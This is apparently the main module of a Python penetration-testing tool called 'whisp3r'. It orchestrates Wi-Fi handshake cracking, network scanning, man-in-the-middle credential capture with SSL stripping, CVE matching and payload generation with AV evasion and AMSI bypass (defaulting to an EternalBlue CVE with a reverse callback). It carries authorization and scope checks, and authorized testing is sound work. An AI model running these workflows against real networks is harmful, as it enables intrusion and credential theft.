class Whisp3rCore:
    def __init__(self, authorized=False, dry_run=False, interface=None, scope_file=None):
        self.authorized = authorized
        self.dry_run = dry_run
        self.interface = interface
        self.scope = ScopeValidator(scope_file)
        self.config = ConfigManager()
        self.audit = AuditLogger()
        self.task_queue = AsyncTaskQueue()
        self.intel = ThreatIntelSync()
        self.reporter = ReportGenerator()
        self.mitm = None
        self.recon_net = ReconNetwork(dry_run, authorized, self.scope, self.config.get("opsec"))
        self.recon_wifi = None
        self.payload_agent = PayloadAgent(dry_run, authorized, self.scope, self.config.get("opsec"))
    def init(self):
        logger.info(f"whisp3r v{TOOL_VERSION} Initializing | Dev: {DEV_ALIAS} | {DEV_EMAIL} | {DEV_WEB}")
        self.intel.update_and_return()
    def workflow_wireless(self):
        if not self.recon_wifi: self.recon_wifi = ReconWireless(self.interface or "wlan0", self.dry_run, self.authorized, self.scope, self.config.get("opsec"))
        adapters = self.recon_wifi.detect_adapters()
        print("\nAdapters:", [a.name for a in adapters])
        if not adapters: return
        iface = adapters[0].name
        self.recon_wifi.monitor_toggle(True)
        csv_pcap = self.recon_wifi.capture_ap(duration=60, prefix="whisp3r_init")
        if csv_pcap:
            aps = self.recon_wifi.parse_aps(csv_pcap[0])
            print(f"Captured {len(aps)} APs")
            self.reporter.export_json([asdict(a) for a in aps], "wireless_aps")
            if input("Crack handshake? (y/n) ").lower() == 'y':
                wl = input("Wordlist path: ").strip()
                res = self.recon_wifi.crack_handshake(csv_pcap[1], wl)
                print("Key:", res)
    def workflow_network(self, subnet="192.168.1.0/24"):
        hosts = self.recon_net.discover(subnet, self.interface or "eth0")
        for h in hosts:
            if self.scope and not self.scope.validate(h.ip): continue
            enhanced = self.recon_net.service_scan(h.ip, self.interface or "eth0")
            print(f"{h.ip} | OS: {enhanced.os_detection} | Banners: {enhanced.service_banners}")
            self.reporter.export_json([asdict(enhanced)], f"scan_{h.ip.replace('.','_')}")
    def workflow_mitm(self, target_ip, gateway_ip, duration=300):
        cfg = MITMConfig(target_ip, gateway_ip=gateway_ip, interface=self.interface or "eth0", duration=duration, spoof_dns=True, ssl_strip=True)
        self.mitm = MITMEngine(cfg, self.authorized, self.dry_run)
        try:
            self.mitm.start()
            print("MITM active. Monitoring traffic...")
            time.sleep(5)
            creds = self.mitm.parse_credentials(OUTPUT_DIR / "mitm_latest.pcap")
            print("Captured creds:", creds)
        finally:
            self.mitm.cleanup()
    def workflow_cve_analysis(self, service_banner):
        db = self.intel.load_local()
        matches = []
        for entry in db.values():
            for prod in entry.affected_products:
                if prod.lower() in service_banner.lower():
                    matches.append(entry)
                    break
        matches.sort(key=lambda x: x.reliability_score, reverse=True)
        print(f"Found {len(matches)} relevant CVEs")
        for m in matches[:3]:
            print(f"  {m.cve_id} | Rel: {m.reliability_score*100:.1f}% | Module: {m.msf_module}")
        return matches
    def workflow_payload(self, cve_id, lhost, lport):
        cfg = PayloadConfig(cve_id, lhost, lport, "exe", evasion_enabled=True, amsi_bypass=True, bof_mode=False)
        path = self.payload_agent.generate(cfg)
        if self.payload_agent.verify_payload(path):
            print(f"Valid payload generated: {path}")
            return path
        return None
    def workflow_integrated(self, subnet):
        if not self.authorized: raise PermissionError("Integrated workflow requires authorization")
        self.workflow_network(subnet)
        hosts = []
        for f in OUTPUT_DIR.glob("nmap_service_*.xml"):
            try:
                tree = ET.parse(f)
                ip = tree.find('.//address[@addrtype="ipv4"]').get('addr')
                hosts.append(ip)
            except: pass
        for ip in hosts:
            banner_data = self.recon_net.service_scan(ip, self.interface)
            for b in banner_data.service_banners.values():
                matches = self.workflow_cve_analysis(b)
                if matches:
                    choice = matches[0]
                    print(f"Auto-targeting {choice.cve_id} (Reliability: {choice.reliability_score*100:.1f}%)")
                    if input("Generate payload? (y/n) ").lower() == 'y':
                        lhost = input("LHOST: ")
                        lport = int(input("LPORT: "))
                        p = self.workflow_payload(choice.cve_id, lhost, lport)
                        if p: print(f"Payload ready: {p}")
    def export_all(self):
        self.reporter.export_json({"version": TOOL_VERSION, "timestamp": datetime.now().isoformat(), "dev": DEV_ALIAS}, "session_meta")
    def shutdown(self):
        if self.mitm: self.mitm.cleanup()
        self.reporter.export_all()
        self.audit.log("shutdown", "system", {}, "completed", self.authorized)
        logger.info("whisp3r shutdown complete. Safe exit.")

def display_menu(title, options):
    print(f"\n{'='*60}\n{title}\n{'='*60}")
    for n, d in options.items(): print(f"  {n}. {d}")
    print("  0. Exit")
    print(f"{'='*60}")
    while True:
        try:
            c = int(input("Select: "))
            if 0 <= c <= len(options): return c
        except: pass

def main():
    parser = argparse.ArgumentParser(description=f"whisp3r v{TOOL_VERSION} | Dev: {DEV_ALIAS} | {DEV_EMAIL} | {DEV_WEB} | {REPO_URL}")
    parser.add_argument('--authorized', action='store_true')
    parser.add_argument('--dry-run', action='store_true')
    parser.add_argument('-i', '--interface', help="Network interface")
    parser.add_argument('--scope', help="RoE JSON scope file")
    parser.add_argument('--mode', choices=['menu', 'wifi', 'net', 'mitm', 'cve', 'payload', 'integrated'], default='menu')
    parser.add_argument('--target', help="Target IP/Subnet/BSSID")
    parser.add_argument('--cve', help="CVE ID")
    parser.add_argument('--lhost', help="Callback IP")
    parser.add_argument('--lport', type=int, default=4444)
    args = parser.parse_args()
    core = Whisp3rCore(args.authorized, args.dry_run, args.interface, args.scope)
    core.init()
    if args.mode != 'menu':
        if args.mode == 'wifi': core.workflow_wireless()
        elif args.mode == 'net': core.workflow_network(args.target or "192.168.1.0/24")
        elif args.mode == 'mitm': core.workflow_mitm(args.target, "192.168.1.1")
        elif args.mode == 'cve': core.workflow_cve_analysis(args.target or "Apache 2.4.41")
        elif args.mode == 'payload': core.workflow_payload(args.cve or "CVE-2017-0144", args.lhost or "10.10.10.10", args.lport)
        elif args.mode == 'integrated': core.workflow_integrated(args.target or "192.168.1.0/24")
    else:
        while True:
            choice = display_menu(f"whisp3r v{TOOL_VERSION} | Dev: {DEV_ALIAS} | Authorized: {args.authorized}", {
                1: "Wireless Recon & Capture", 2: "Network Scan & Service Enum", 3: "MITM Simulation", 4: "CVE Intelligence & Prioritization", 5: "Payload Generation & Evasion", 6: "Integrated Offensive Workflow", 7: "Update Threat Intel DB", 8: "Export All Findings", 9: "Generate Executive Report", 10: "System Info & Help"
            })
            if choice == 0: break
            elif choice == 1: core.workflow_wireless()
            elif choice == 2: core.workflow_network()
            elif choice == 3: core.workflow_mitm(input("Target IP: "), input("Gateway IP: "))
            elif choice == 4: core.workflow_cve_analysis(input("Service/Banner: "))
            elif choice == 5: core.workflow_payload(input("CVE: "), input("LHOST: "), int(input("LPORT: ")))
            elif choice == 6: core.workflow_integrated(input("Subnet: "))
            elif choice == 7: core.intel.update_and_return()
            elif choice == 8: core.export_all()
            elif choice == 9: core.reporter.generate_executive_report([])
            elif choice == 10: print(f"v{TOOL_VERSION} | Dev: {DEV_ALIAS} | {DEV_EMAIL} | {DEV_WEB} | {REPO_URL}")
            input("\nPress Enter...")
    core.shutdown()

def handle_signal(sig, frame):
    logger.warning("Interrupt. Cleaning up...")
    sys.exit(0)

if __name__ == "__main__":
    signal.signal(signal.SIGINT, handle_signal)
    signal.signal(signal.SIGTERM, handle_signal)
    main()